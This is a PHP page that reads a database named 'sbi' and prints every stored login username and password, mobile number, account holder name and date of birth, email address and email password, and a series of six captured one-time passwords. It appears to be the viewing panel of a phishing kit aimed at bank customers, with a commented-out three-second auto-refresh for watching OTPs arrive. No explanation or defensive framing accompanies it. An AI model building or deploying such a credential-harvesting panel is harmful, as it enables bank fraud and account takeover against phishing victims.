<!DOCTYPE html>
<html>
<head>
<title>database</title>
<style>
table {
border-collapse: collapse;
width: 100%;
color: #588c7e;
font-family: monospace;
font-size: 25px;
text-align: left;
}
th {
background-color: #588c7e;
color: white;
}
tr:nth-child(even) {background-color: #f2f2f2}
</style>
</head>
<body>

<!-- <script>
   setTimeout (function() {
      location.reload();
   }, 3000);
   
</script> -->

<div>
<div>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";
// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `login` ORDER BY id DESC";
      // "SELECT MAX(id) FROM `login` 

// $sql = "SELECT MAX(id) FROM `login`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<br><spam>Id </spam>" . $row["id"]. "<spam>.. Username => </spam>" . $row["username"] . "<br><spam>Password => </spam>"
. $row["password"]."<br><spam>Mobile => </spam>". $row["mobile"]. "<br>";
}
echo "";
} else { echo ""; }
$conn->close();



?>

</div>
<hr>
<div>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<spam>Id </spam>" . $row["id"]. "..  <spam>1st_OTP => </spam>" . $row["otp"]
   . "<br><br>";
}
echo "<br> <br>";
} else { echo ""; }
$conn->close();
?>
</div>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `account` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<spam>Id </spam>" . $row["id"]. "..  <spam>Account_Holder_Name => </spam>" . $row["account"] . "<br><spam>DOB => </spam>"
. $row["dob"]. "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp2` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
   echo "<spam>Id </spam>" . $row["id"]. "..  <spam>2nd_OTP => </spam>" . $row["otp2"]
   . "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp3` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo  "<spam>Id </spam>" . $row["id"]. "..  <spam>3rd_OTP => </spam>" . $row["otp3"]
   . "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `email` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo  "<spam>Id </spam>" . $row["id"]. "..  <spam>Email_id => </spam>" . $row["email"] . "<br><spam>Password => </spam>"
. $row["epassword"]. "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";


// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp4` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo  "<spam>Id </spam>" . $row["id"]. "..  <spam>4th_OTP => </spam>" . $row["otp4"]
   . "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";


// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `password` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo  "<spam>Id </spam>" . $row["id"]. "..  <spam>Password => </spam>" . $row["password1"] . "<br><spam>New Password => </spam>"
. $row["password1"]. "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";


// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp5` ORDER BY id DESC";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo  "<spam>Id </spam>" . $row["id"]. "..  <spam>5th_OTP =>  </spam>" . $row["otp5"]
   . "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
<hr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp6` ORDER BY id DESC ";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<spam>Id </spam>" . $row["id"]. "..  <spam>6th_OTP => </spam>" . $row["otp6"]
   . "<br><br>";
}
echo "";
} else { echo ""; }
$conn->close();
?>
</table>
</div>
<hr><hr>
</body>
</html>